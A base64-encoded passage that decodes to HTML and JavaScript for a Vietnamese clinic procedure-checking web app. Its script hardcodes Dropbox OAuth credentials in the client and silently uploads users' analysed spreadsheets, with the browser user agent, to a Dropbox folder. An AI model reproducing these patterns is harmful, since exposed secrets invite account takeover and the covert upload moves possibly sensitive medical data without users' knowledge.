ucHV0IiBzdHlsZT0id2lkdGg6YXV0bzsiPjwvc2VsZWN0Pg0KPC9kaXY+DQoNCiAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSBoZXJiLXRhYmxlIj4NCiAgICA8dGhlYWQ+DQogICAgICA8dHI+DQogICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgDQogICAgICAgIDx0aD5LaHVuZyBnaeG7nSB0cuG7kW5nIGJ14buVaSBzw6FuZzwvdGg+DQogICAgICAgIDx0aD5LaHVuZyBnaeG7nSB0cuG7kW5nIGJ14buVaSBjaGnhu4F1PC90aD4NCiAgICAgIDwvdHI+DQogICAgPC90aGVhZD4NCiAgICA8dGJvZHkgaWQ9ImF2YWlsYWJpbGl0eUJvZHkiPjwvdGJvZHk+DQogIDwvdGFibGU+DQo8L2Rpdj4NCjwhLS0gS+G6vlQgVEjDmkM6IELhuqJORyBHSeG7nCBUUuG7kE5HIFThu6pORyBOR8av4bucSSAtLT4NCg0KDQoNCg0KPCEtLSBOw5pUIEhJ4buCTiBUSOG7iiBUSOG7piBUSFXhuqxUIFPhuq5DIFRIVeG7kEMgLS0+DQoNCg0KICANCjwhLS0gQuG6ok5HIFRI4bumIFRIVeG6rFQgU+G6rkMgVEhV4buQQyBUSEFORyAtLT4NCjxkaXYgaWQ9ImhlcmJQcm9jZWR1cmVUYWJsZSIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7IG1hcmdpbi10b3A6IDIwcHg7Ij4NCiAgPGRpdiBjbGFzcz0ibWFpbmJsb2sic3R5bGU9Im1hcmdpbi1ib3R0b206IDEwcHg7Ij4NCiAgICA8ZGl2Pg0KICAgIDxzZWxlY3QgaWQ9ImhlcmJEb2N0b3JGaWx0ZXIiIGNsYXNzPSJsb2dpbi1pbnB1dCIgc3R5bGU9IndpZHRoOmF1dG87IG1hcmdpbi1sZWZ0OiAyMHB4OyI+DQogICAgICA8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqMgYsOhYyBzxKk8L29wdGlvbj4NCiAgICA8L3NlbGVjdD4NCiAgICA8c2VsZWN0IGlkPSJoZXJiRGF0ZUZpbHRlciIgY2xhc3M9ImxvZ2luLWlucHV0IiBzdHlsZT0id2lkdGg6YXV0bzsiPjwvc2VsZWN0Pg0KICA8L2Rpdj48L2Rpdj4NCg0KPCEtLSBUw5NNIFThuq5UIE9VVExJRVIgLS0+DQo8ZGl2IGlkPSJoZXJiT3V0bGllclN1bW1hcnkiIHN0eWxlPSJkaXNwbGF5Om5vbmU7bWFyZ2luOjhweCAyMHB4O2ZvbnQtc2l6ZToxNHB4Ij4NCiAgPCEtLSBu4buZaSBkdW5nIHPhur0gxJHGsOG7o2MgSlMgY+G6rXAgbmjhuq10IC0tPg0KPC9kaXY+DQogIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgIDx0aGVhZD4NCiAgICAgIDx0cj4NCiAgICAgICAgPHRoPkjhu40gdMOqbiBi4buHbmggbmjDom48L3RoPg0KICAgICAgICA8dGg+VGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgIDx0aD5OZ8OgeTwvdGg+DQogICAgICAgIDx0aD5UaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgIDwvdHI+DQogICAgPC90aGVhZD4NCiAgICA8dGJvZHkgaWQ9ImhlcmJUYWJsZUJvZHkiPjwvdGJvZHk+DQogIDwvdGFibGU+DQo8L2Rpdj4NCg0KDQo8IS0tIFBPUFVQIERBTkggU8OBQ0ggT1VUTElFUiBT4bquQyBUSFXhu5BDIFRIQU5HIC0tPg0KPGRpdiBpZD0iaGVyYk91dGxpZXJNb2RhbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDtpbnNldDowO3otaW5kZXg6MTEwMDAiPg0KICA8ZGl2IGlkPSJoZXJiT3V0bGllckJhY2tkcm9wIiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7aW5zZXQ6MDtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KSI+PC9kaXY+DQogIDxkaXYgcm9sZT0iZGlhbG9nIiBhcmlhLW1vZGFsPSJ0cnVlIg0KICAgICAgIGNsYXNzPSJtb2RhbC1iYXNlIG1vZGFsLWxhcmdlIj4NCiAgICA8aDM+RGFuaCBzw6FjaCBjYSBraMOhYyDEkWEgc+G7kTwvaDM+DQogICAgPGRpdiBzdHlsZT0ibWFyZ2luOjEwcHggMDtmb250LXNpemU6MTNweCIgaWQ9ImhlcmJPdXRsaWVyTW9kYWxJbmZvIj48L2Rpdj4NCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIiBzdHlsZT0ibWFyZ2luLXRvcDoxMHB4Ij4NCiAgICAgIDx0aGVhZD4NCiAgICAgICAgPHRyPg0KICAgICAgICAgIDx0aD5I4buNIHTDqm4gYuG7h25oIG5ow6JuPC90aD4NCiAgICAgICAgICA8dGg+VGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgICA8dGg+VGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgPC90cj4NCiAgICAgIDwvdGhlYWQ+DQogICAgICA8dGJvZHkgaWQ9ImhlcmJPdXRsaWVyTW9kYWxCb2R5Ij48L3Rib2R5Pg0KICAgIDwvdGFibGU+DQogICAgPGJyLz4NCiAgICA8YnV0dG9uIGNsYXNzPSJidG4iIHR5cGU9ImJ1dHRvbiIgaWQ9ImhlcmJPdXRsaWVyQ2xvc2VCdG4iPsSQw7NuZzwvYnV0dG9uPg0KICA8L2Rpdj4NCjwvZGl2Pg0KDQoNCg0KDQoNCg0KPGJyLz4NCjxici8+DQoNCg0KPGRpdiBpZD0iZXJyb3JTZWN0aW9uIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPg0KPGJyLz4NCjxoMyBpZD0iZXJyb3JTZWN0aW9uVGl0bGUiPkzhu5dpIE5o4bqtcCBTYWkgVGjhu51pIEdpYW48L2gzPg0KPGRpdiBpZD0ib3BlcmF0b3JGaWx0ZXJFcnJvciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCjxsYWJlbCBmb3I9Im9wZXJhdG9yU2VsZWN0RXJyb3IiPkzhu41jIHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2xhYmVsPg0KPHNlbGVjdCBjbGFzcz0ibG9naW4taW5wdXQiIGlkPSJvcGVyYXRvclNlbGVjdEVycm9yIj4NCjxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPg0KPC9zZWxlY3Q+DQo8L2Rpdj4NCjxkaXYgaWQ9ImVycm9yTG9nIj48L2Rpdj4NCjwvZGl2Pg0KPGJyLz4NCg0KPGRpdiBpZD0icmVzdWx0U2VjdGlvbiIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCjxoMyBpZD0icmVzdWx0U2VjdGlvblRpdGxlIj5UcsO5bmcgR2nhu508L2gzPiANCg0KPGRpdiBpZD0ib3BlcmF0b3JGaWx0ZXIiIHN0eWxlPSJtYXJnaW4tdG9wOiAxNXB4OyBkaXNwbGF5OiBub25lOyI+DQo8bGFiZWwgZm9yPSJvcGVyYXRvclNlbGVjdCI+TOG7jWMgdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvbGFiZWw+DQo8c2VsZWN0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9Im9wZXJhdG9yU2VsZWN0Ij4NCjxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPg0KPC9zZWxlY3Q+DQo8L2Rpdj48YnIvPg0KDQo8dGFibGUgaWQ9InJlc3VsdFRhYmxlIj4NCjx0aGVhZD4NCjx0cj4NCjx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQo8dGg+PGkgY2xhc3M9ImZhciBmYS1jYWxlbmRhci1hbHQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nw6B5PC90aD4NCjx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQo8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCjx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBH4bujaSDDvSBnaeG7nTwvdGg+DQo8L3RyPg0KPC90aGVhZD4NCjx0Ym9keSBpZD0icmVzdWx0Qm9keSI+PC90Ym9keT4NCjwvdGFibGU+DQoNCg0KPC9kaXY+DQo8IS0tIELhuqJORyBH4bquTiBTQUkgTcOBWSAtLT4NCjxkaXYgaWQ9Im1hY2hpbmVFcnJvclNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogIDxici8+DQogIDxoMyBpZD0ibWFjaGluZUVycm9yU2VjdGlvblRpdGxlIj5H4bqvbiBTYWkgTcOjIE3DoXk8L2gzPg0KICA8ZGl2IGlkPSJtYWNoaW5lT3BlcmF0b3JGaWx0ZXIiIHN0eWxlPSJtYXJnaW4tdG9wOiAxNXB4OyBkaXNwbGF5OiBub25lOyI+DQogICAgPGxhYmVsIGZvcj0ibWFjaGluZU9wZXJhdG9yU2VsZWN0Ij5M4buNYyB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCiAgICA8c2VsZWN0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9Im1hY2hpbmVPcGVyYXRvclNlbGVjdCI+DQogICAgICA8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4NCiAgICA8L3NlbGVjdD4NCiAgPC9kaXY+DQogIDxkaXYgaWQ9Im1hY2hpbmVFcnJvckxvZyI+PC9kaXY+DQo8L2Rpdj4NCjxici8+DQoNCjwhLS0gQuG6ok5HIFhVTkcgxJDhu5hUIE3DgVkgLS0+DQo8ZGl2IGlkPSJtYWNoaW5lQ29uZmxpY3RTZWN0aW9uIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPg0KICA8YnIvPg0KICA8aDMgaWQ9Im1hY2hpbmVDb25mbGljdFNlY3Rpb25UaXRsZSI+WHVuZyDEkOG7mXQgTcOheTwvaDM+DQogIDxkaXYgaWQ9Im1hY2hpbmVDb25mbGljdE9wZXJhdG9yRmlsdGVyIiBzdHlsZT0ibWFyZ2luLXRvcDogMTVweDsgZGlzcGxheTogbm9uZTsiPg0KICAgIDxsYWJlbCBmb3I9Im1hY2hpbmVDb25mbGljdE9wZXJhdG9yU2VsZWN0Ij5M4buNYyB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCiAgICA8c2VsZWN0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9Im1hY2hpbmVDb25mbGljdE9wZXJhdG9yU2VsZWN0Ij4NCiAgICAgIDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPg0KICAgIDwvc2VsZWN0Pg0KICA8L2Rpdj4NCiAgPGRpdiBpZD0ibWFjaGluZUNvbmZsaWN0TG9nIj48L2Rpdj4NCjwvZGl2Pg0KPGJyLz4NCjwhLS0gQuG6ok5HIFFVw4pOIEfhuq5OIE3DgyBNw4FZIC0tPg0KPGRpdiBpZD0ibWlzc2luZ01hY2hpbmVTZWN0aW9uIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPg0KICA8YnIvPg0KICA8aDMgaWQ9Im1pc3NpbmdNYWNoaW5lU2VjdGlvblRpdGxlIj5RdcOqbiBH4bqvbiBNw6MgTcOheTwvaDM+DQogIDxkaXYgaWQ9Im1pc3NpbmdNYWNoaW5lT3BlcmF0b3JGaWx0ZXIiIHN0eWxlPSJtYXJnaW4tdG9wOiAxNXB4OyBkaXNwbGF5OiBub25lOyI+DQogICAgPGxhYmVsIGZvcj0ibWlzc2luZ01hY2hpbmVPcGVyYXRvclNlbGVjdCI+TOG7jWMgdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvbGFiZWw+DQogICAgPHNlbGVjdCBjbGFzcz0ibG9naW4taW5wdXQiIGlkPSJtaXNzaW5nTWFjaGluZU9wZXJhdG9yU2VsZWN0Ij4NCiAgICAgIDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPg0KICAgIDwvc2VsZWN0Pg0KICA8L2Rpdj4NCiAgPGRpdiBpZD0ibWlzc2luZ01hY2hpbmVMb2ciPjwvZGl2Pg0KPC9kaXY+DQo8YnIvPg0KDQo8IS0tIELhuqJORyBUSOG7nEkgR0lBTiBC4bquVCDEkOG6plUgS0jDgUMgTkfDgFkgVEjhu7BDIEhJ4buGTiAtLT4NCjxkaXYgaWQ9ImRhdGVNaXNtYXRjaFNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogIDxici8+DQogIDxoMyBpZD0iZGF0ZU1pc21hdGNoU2VjdGlvblRpdGxlIj5UaOG7nWkgR2lhbiBZIEzhu4duaCBLaMOhYyBUaOG7nWkgR2lhbiBUaOG7sWMgSGnhu4duPC9oMz4NCiAgPGRpdiBpZD0iZGF0ZU1pc21hdGNoT3BlcmF0b3JGaWx0ZXIiIHN0eWxlPSJtYXJnaW4tdG9wOiAxNXB4OyBkaXNwbGF5OiBub25lOyI+DQogICAgPGxhYmVsIGZvcj0iZGF0ZU1pc21hdGNoT3BlcmF0b3JTZWxlY3QiPkzhu41jIHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2xhYmVsPg0KICAgIDxzZWxlY3QgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0iZGF0ZU1pc21hdGNoT3BlcmF0b3JTZWxlY3QiPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQogICAgPC9zZWxlY3Q+DQogIDwvZGl2Pg0KICA8ZGl2IGlkPSJkYXRlTWlzbWF0Y2hMb2ciPjwvZGl2Pg0KPC9kaXY+DQo8YnIvPg0KPC9kaXY+DQo8L2Rpdj4NCjxzY3JpcHQ+DQovLyBU4bqjaSBYTFNYIGNo4buJIGtoaSBj4bqnbg0KYXN5bmMgZnVuY3Rpb24gZW5zdXJlWExTWCgpIHsNCiAgaWYgKCF3aW5kb3cuWExTWCkgew0KICAgIGF3YWl0IGltcG9ydCgnaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMveGxzeC8wLjE4LjUveGxzeC5mdWxsLm1pbi5qcycpOw0KICB9DQp9DQoNCi8vIFThuqNpIERyb3Bib3ggU0RLIGNo4buJIGtoaSBj4bqnbg0KYXN5bmMgZnVuY3Rpb24gZW5zdXJlRHJvcGJveCgpIHsNCiAgaWYgKCF3aW5kb3cuRHJvcGJveCkgew0KICAgIGF3YWl0IGltcG9ydCgnaHR0cHM6Ly91bnBrZy5jb20vZHJvcGJveC9kaXN0L0Ryb3Bib3gtc2RrLm1pbi5qcycpOw0KICB9DQp9DQoNCg0KICAgICAgICAvLyBEYW5oIHPDoWNoIHRo4bunIHRodeG6rXQNCiAgICAgICBsZXQgUFJPQ0VEVVJFUyA9IHt9Ow0KDQphc3luYyBmdW5jdGlvbiBsb2FkUHJvY2VkdXJlcygpIHsNCiAgICB0cnkgew0KICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL2NoYXVfdGh1dGh1YXQudHh0Jyk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICBQUk9DRURVUkVTID0gSlNPTi5wYXJzZSh0ZXh0KTsNCiAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgYWxlcnQoJ0tow7RuZyB0aOG7gyB04bqjaSBkYW5oIHPDoWNoIHRo4bunIHRodeG6rXQ6ICcgKyBlcnIubWVzc2FnZSk7DQogICAgICAgIGNvbnNvbGUuZXJyb3IoZXJyKTsNCiAgICB9DQp9DQoNCgkJDQoNCiAgICAgICAgLy8gQmnhur9uIHRvw6BuIGPhu6VjDQogICAgICAgIGxldCBlcnJvckxvZyA9IFtdOw0KICAgICAgICBsZXQgY3VycmVudFVzZXIgPSBudWxsOw0KICAgICAgICBsZXQgYWxsUHJvY2VkdXJlcyA9IFtdOw0KICAgICAgIC8vIEJp4bq/biBjaG8ga2nhu4NtIHRyYSBtw6F5DQogICAgICAgIGxldCBtYWNoaW5lRXJyb3JMb2cgPSBbXTsNCiAgICAgICAgbGV0IG1hY2hpbmVDb25mbGljdExvZyA9IFtdOw0KCQlsZXQgbWlzc2luZ01hY2hpbmVMb2cgPSBbXTsNCgkJbGV0IGRhdGVNaXNtYXRjaExvZyA9IFtdOw0KICAgICAgICAvLyA9PT0gS+G6vlQgVEjDmkMgQ09ERSBN4buaSSA9PT0NCg0KY29uc3QgRFJPUEJPWF9DT05GSUcgPSB7DQogICAgcmVmcmVzaFRva2VuOiAiY3RnQnZqM0lzdGNBQUFBQUFBQUFBVkZDc0lYSXV6X0NUUXBJbWFrY0M0Y3VRVjhEdW1rZmdEV0lzOFZHUHZGVCIsDQogICAgY2xpZW50SWQ6ICJ3OGF3ajJxeG8zYWl2NWUiLA0KICAgIGNsaWVudFNlY3JldDogInFrcW8xdTdhdHM3Ymw5ZyINCn07DQoNCmFzeW5jIGZ1bmN0aW9uIGdldEFjY2Vzc1Rva2VuKCkgew0KICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2goImh0dHBzOi8vYXBpLmRyb3Bib3hhcGkuY29tL29hdXRoMi90b2tlbiIsIHsNCiAgICAgICAgbWV0aG9kOiAiUE9TVCIsDQogICAgICAgIGhlYWRlcnM6IHsNCiAgICAgICAgICAgICJBdXRob3JpemF0aW9uIjogIkJhc2ljICIgKyBidG9hKGAke0RST1BCT1hfQ09ORklHLmNsaWVudElkfToke0RST1BCT1hfQ09ORklHLmNsaWVudFNlY3JldH1gKSwNCiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIg0KICAgICAgICB9LA0KICAgICAgICBib2R5OiBgZ3JhbnRfdHlwZT1yZWZyZXNoX3Rva2VuJnJlZnJlc2hfdG9rZW49JHtEUk9QQk9YX0NPTkZJRy5yZWZyZXNoVG9rZW59YA0KICAgIH0pOw0KICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7DQogICAgcmV0dXJuIGRhdGEuYWNjZXNzX3Rva2VuOw0KfQ0KLy8gVOG6o2kgWExTWCBjaOG7iSBraGkgY+G6p24NCmFzeW5jIGZ1bmN0aW9uIGVuc3VyZVhMU1goKSB7DQogIGlmICghd2luZG93LlhMU1gpIHsNCiAgICBhd2FpdCBpbXBvcnQoJ2h0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL3hsc3gvMC4xOC41L3hsc3guZnVsbC5taW4uanMnKTsNCiAgfQ0KfQ0KDQovLyBU4bqjaSBEcm9wYm94IFNESyBjaOG7iSBraGkgY+G6p24NCmFzeW5jIGZ1bmN0aW9uIGVuc3VyZURyb3Bib3goKSB7DQogIGlmICghd2luZG93LkRyb3Bib3gpIHsNCiAgICBhd2FpdCBpbXBvcnQoJ2h0dHBzOi8vdW5wa2cuY29tL2Ryb3Bib3gvZGlzdC9Ecm9wYm94LXNkay5taW4uanMnKTsNCiAgfQ0KfQ0KYXN5bmMgZnVuY3Rpb24gdXBsb2FkVG9Ecm9wYm94KGZpbGUsIGtob2FWYWx1ZSwgbmdheVZhbHVlLCBzdGF0cyA9IHsgaGVyYjogMCwgdGltZTogMCwgY29uZmxpY3Q6IDAgfSkgew0KIGNvbnN0IGN1cnJlbnRVc2VyID0gc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpOw0KICBpZiAoY3VycmVudFVzZXIgJiYgY3VycmVudFVzZXIudG9Mb3dlckNhc2UoKSA9PT0gJ2RvY3RvcicpIHsNCiAgICByZXR1cm47IA0KICB9DQogIGF3YWl0IGVuc3VyZURyb3Bib3goKTsgLy8gxJHhuqNtIGLhuqNvIGPDsyBEcm9wYm94IFNESw0KICAgIGNvbnN0IGFjY2Vzc1Rva2VuID0gYXdhaXQgZ2V0QWNjZXNzVG9rZW4oKTsNCiAgICBjb25zdCBkYnggPSBuZXcgRHJvcGJveC5Ecm9wYm94KHsgYWNjZXNzVG9rZW4gfSk7DQoNCiAgICBjb25zdCBwY05hbWUgPSBuYXZpZ2F0b3IudXNlckFnZW50Ow0KICAgIGNvbnN0IG5vdyA9IG5ldyBEYXRlKCkudG9Mb2NhbGVTdHJpbmcoJ3ZpLVZOJyk7DQogICAgY29uc3QgZmlsZW5hbWUgPSBgJHtmaWxlLm5hbWUucmVwbGFjZSgvXC5bXi8uXSskLywgIiIpfV8ke0RhdGUubm93KCl9Lnhsc3hgOw0KDQogICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBkYnguZmlsZXNVcGxvYWQoew0KICAgICAgICBwYXRoOiBgL3RodXRodWF0LyR7ZmlsZW5hbWV9YCwNCiAgICAgICAgY29udGVudHM6IGZpbGUsDQogICAgICAgIG1vZGU6ICdhZGQnLA0KICAgICAgICBhdXRvcmVuYW1lOiB0cnVlDQogICAgfSk7DQoNCiAgICAvLyBHaGkgbWV0YWRhdGEgdsOgbyBmaWxlIEpTT04gdHJ1bmcgdMOibSAoZOG6oW5nIHRleHQgYXBwZW5kKQ0KICAgIGNvbnN0IG1ldGFkYXRhID0gew0KICAgICAgICBzdHQ6IERhdGUubm93KCksDQogICAga2hvYToga2hvYVZhbHVlLCAgICAgICAgLy8g4pyFIMSRw7puZyBiaeG6v24NCiAgICBuZ2F5OiBuZ2F5VmFsdWUsICAgIC8vIOKchSDEkcO6bmcgYmnhur9uDQogICAgICAgIGxpbms6ICJodHRwczovL3d3dy5kcm9wYm94LmNvbS9ob21lL3RodXRodWF0P3ByZXZpZXc9IiArIGVuY29kZVVSSUNvbXBvbmVudChmaWxlbmFtZSksDQogICAgICAgIHBjOiBwY05hbWUsDQogICAgICAgIHRpbWU6IG5vdywNCgkJaGVyYl9lcnJvcnM6IE51bWJlcihzdGF0cy5oZXJiKSB8fCAwLA0KICAgIHRpbWVfZXJyb3JzOiBOdW1iZXIoc3RhdHMudGltZSkgfHwgMCwNCiAgIGNvbmZsaWN0X2Vycm9yczogTnVtYmVyKHN0YXRzLmNvbmZsaWN0KSB8fCAwDQogICAgfTsNCg0KICAgIGF3YWl0IGFwcGVuZERyb3Bib3hMb2cobWV0YWRhdGEpOw0KfQ0KDQphc3luYyBmdW5jdGlvbiBhcHBlbmREcm9wYm94TG9nKGxvZ0l0ZW0pIHsNCiAgICBjb25zdCBhY2Nlc3NUb2tlbiA9IGF3YWl0IGdldEFjY2Vzc1Rva2VuKCk7DQogICAgY29uc3QgZGJ4ID0gbmV3IERyb3Bib3guRHJvcGJveCh7IGFjY2Vzc1Rva2VuIH0pOw0KDQogICAgY29uc3QgbG9nUGF0aCA9ICcvdGh1dGh1YXQvbG9nLmpzb24nOw0KICAgIGxldCBsb2dzID0gW107DQoNCiAgICB0cnkgew0KICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGRieC5maWxlc0Rvd25sb2FkKHsgcGF0aDogbG9nUGF0aCB9KTsNCiAgICAgICAgY29uc3QgYmxvYiA9IHJlc3BvbnNlLnJlc3VsdC5maWxlQmxvYjsgLy8g4pyFIGTDuW5nIC5yZXN1bHQuZmlsZUJsb2INCiAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IGJsb2IudGV4dCgpOw0KICAgICAgICBsb2dzID0gSlNPTi5wYXJzZSh0ZXh0KTsNCiAgICB9IGNhdGNoIChlKSB7DQogICAgICAgIGNvbnNvbGUud2FybigiS2jDtG5nIHTDrG0gdGjhuqV5IGxvZy5qc29uIGPFqSBob+G6t2MgbOG7l2kgxJHhu41jOiIsIGUpOw0KICAgICAgICBsb2dzID0gW107DQogICAgfQ0KDQogICAgLy8gQ2jDqG4gbeG7m2kgbmjhuqV0IGzDqm4gxJHhuqd1DQogICAgbG9ncy51bnNoaWZ0KGxvZ0l0ZW0pOw0KDQogICAgYXdhaXQgZGJ4LmZpbGVzVXBsb2FkKHsNCiAgICAgICAgcGF0aDogbG9nUGF0aCwNCiAgICAgICAgY29udGVudHM6IEpTT04uc3RyaW5naWZ5KGxvZ3MsIG51bGwsIDIpLA0KICAgICAgICBtb2RlOiB7ICcudGFnJzogJ292ZXJ3cml0ZScgfSwgLy8g4pyFIEdoaSDEkcOoIGLhuq90IGJ14buZYw0KICAgICAgICBhdXRvcmVuYW1lOiBmYWxzZQ0KICAgIH0pOw0KfQ0KDQoNCmFzeW5jIGZ1bmN0aW9uIGluaXRBZnRlckxvZ2luKCkgew0KICBhd2FpdCBQcm9taXNlLmFsbChbDQogICAgbG9hZFByb2NlZHVyZXMoKSwNCiAgICBsb2FkQ29uZmxpY3RSdWxlcygpDQogIF0pOw0KfQ0KDQoNCg0KICAgICAgICAvLyA9PT09PT09PT09IFBI4bqmTiDEkMSCTkcgTkjhuqxQID09PT09PT09PT0gLy8NCmFzeW5jIGZ1bmN0aW9uIGNoZWNrU2F2ZWRMb2dpbigpIHsNCiAgICBjb25zdCBzYXZlZFVzZXIgPSBzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdtZWRVc2VyJyk7DQogICAgaWYgKHNhdmVkVXNlcikgew0KICAgICAgICBjdXJyZW50VXNlciA9IHNhdmVkVXNlcjsNCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWluQ29udGVudCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBpbml0QWZ0ZXJMb2dpbigpOyAvLyBhdXRvLWxvZ2luIG3hu5tpIGxvYWQgZOG7ryBsaeG7h3UNCiAgICB9DQp9DQoNCmxldCBpc0xvZ2luQWN0aW9uID0gZmFsc2U7IC8vIOKchSBUaMOqbSBkw7JuZyBuw6B5DQpsZXQgYW5hbHl6ZVBvcHVwVGltZXI7IC8vIOKchSBUaMOqbSBkw7JuZyBuw6B5DQphc3luYyBmdW5jdGlvbiBjaGVja0xvZ2luKCkgew0KICBjb25zdCBidG5Mb2dpbiAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luQnRuJyk7DQogIGNvbnN0IHVzZXJuYW1lICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcm5hbWVJbnB1dCcpLnZhbHVlLnRyaW0oKTsNCiAgY29uc3QgcGFzc3dvcmQgICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykudmFsdWUudHJpbSgpOw0KICBjb25zdCBsb2dpbkVycm9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luRXJyb3InKTsNCg0KICBidG5Mb2dpbi5kaXNhYmxlZCA9IHRydWU7DQogIGJ0bkxvZ2luLmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXNwaW5uZXIgZmEtc3BpbiI+PC9pPiDEkGFuZyDEkcSDbmcgbmjhuq1wLi4uJzsNCg0KICBjb25zdCBwb3B1cCAgICAgICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKTsNCiAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICBsZXQgbG9naW5Qb3B1cFNob3duID0gZmFsc2U7DQoNCiAgLy8gU2F1IDJzIGtp4buDbSB0cmE6IHbhuqtuIOG7nyB0cmFuZyDEkcSDbmcgbmjhuq1wICYgxJFhbmcgbG9hZGluZz8NCmNvbnN0IHNsb3dMb2dpblRpbWVyID0gc2V0VGltZW91dCgoKSA9PiB7DQogICAgaWYgKCFpc0xvZ2luQWN0aW9uKSByZXR1cm47IC8vI